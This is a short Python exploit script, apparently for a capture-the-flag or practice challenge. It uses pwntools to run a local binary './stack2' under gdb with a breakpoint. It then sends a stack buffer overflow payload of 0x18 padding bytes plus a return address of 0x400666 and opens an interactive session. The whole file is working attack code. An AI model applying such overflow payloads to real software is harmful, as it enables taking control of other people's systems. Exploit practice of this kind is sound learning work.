from pwn import *

#io = process('./stack2')
io = gdb.debug(['./stack2'], "b *0x4006B4")

io.sendline(b'a'*0x18 + p64(0x400666))

io.interactive()
